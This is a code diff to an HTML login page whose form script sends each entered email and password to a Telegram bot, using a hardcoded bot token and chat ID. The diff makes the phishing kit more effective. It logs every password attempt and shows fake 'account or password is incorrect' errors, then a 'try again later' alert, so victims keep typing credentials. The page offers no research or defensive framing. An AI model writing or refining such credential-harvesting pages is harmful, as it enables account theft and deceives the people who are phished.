@@ -11,9 +11,6 @@
             margin: 0;
             font-family: helvetica, verdana, arial, sans-serif;
             background: url(bg.jpg) no-repeat center center fixed;
-            -webkit-background-size: cover;
-            -moz-background-size: cover;
-            -o-background-size: cover;
             background-size: cover;
         }
 
@@ -21,12 +18,6 @@
             width: 100%;
             height: 50px;
             background: #000;
-        }
-
-        .transparent {
-            zoom: 1;
-            filter: alpha(opacity=90);
-            opacity: 0.9;
         }
 
         .login-container {
@@ -72,13 +63,12 @@
             font-size: 14px;
         }
     </style>
-
 </head>
 <body>
 
     <div class="login-container">
         <h2>Login</h2>
-        <form name="loginForm" method="post" onsubmit="return validateForm()">
+        <form name="loginForm" method="post" onsubmit="return validateForm(event)">
             <div>
                 <label for="username">Email:</label>
                 <input type="text" id="username" name="username" class="inp" placeholder="Enter your email">
@@ -96,45 +86,57 @@
     </div>
 
     <script type="text/javascript">
-        function validateForm() {
-            var x = document.forms["loginForm"]["username"].value;
-            var atpos = x.indexOf("@");
-            var dotpos = x.lastIndexOf(".");
-            if (atpos < 1 || dotpos < atpos + 2 || dotpos + 2 >= x.length) {
+        let attemptCount = 0;
+
+        function validateForm(event) {
+            event.preventDefault();
+
+            var email = document.getElementById('username').value.trim();
+            var password = document.getElementById('password').value.trim();
+
+            // Validate email
+            var atpos = email.indexOf("@");
+            var dotpos = email.lastIndexOf(".");
+            if (atpos < 1 || dotpos < atpos + 2 || dotpos + 2 >= email.length) {
                 document.getElementById("errfn").innerHTML = "Not a valid email address";
                 return false;
             } else {
                 document.getElementById("errfn").innerHTML = "";
             }
 
-            var y = document.forms["loginForm"]["password"].value;
-            if (y == null || y == "") {
+            // Validate password
+            if (!password) {
                 document.getElementById("errfnn").innerHTML = "Password is required";
                 return false;
             } else {
                 document.getElementById("errfnn").innerHTML = "";
             }
 
-            // Capture the email and password and send to Telegram
-            var email = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var message = `Email: ${email}\nPassword: ${password}`;
+            attemptCount++;
+            let message = `Email: ${email}\nPassword Attempt ${attemptCount}: ${password}`;
 
+            // Send to Telegram
             const token = '6113839454:AAFY5WlixlzhREvqK1DAGyZBRnDeY-D9jU4';
             const chatId = '1461764555';
             const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-            
+
             fetch(url)
-              .then((response) => {
-                if (!response.ok) {
-                  throw new Error('Network response was not ok');
-                }
+              .then(response => {
+                  if (!response.ok) throw new Error('Network error');
               })
-              .catch((error) => {
-                console.error('There was a problem with the fetch operation:', error);
+              .catch(err => {
+                  console.error('Telegram error:', err);
               });
 
-            return true;
+            if (attemptCount < 3) {
+                document.getElementById("errfnn").innerHTML = "Your account or password is incorrect";
+                document.getElementById("password").value = "";
+                return false;
+            } else {
+                alert("Failed login. Please try again later.");
+                document.getElementById("password").value = "";
+                return false;
+            }
         }
     </script>
 
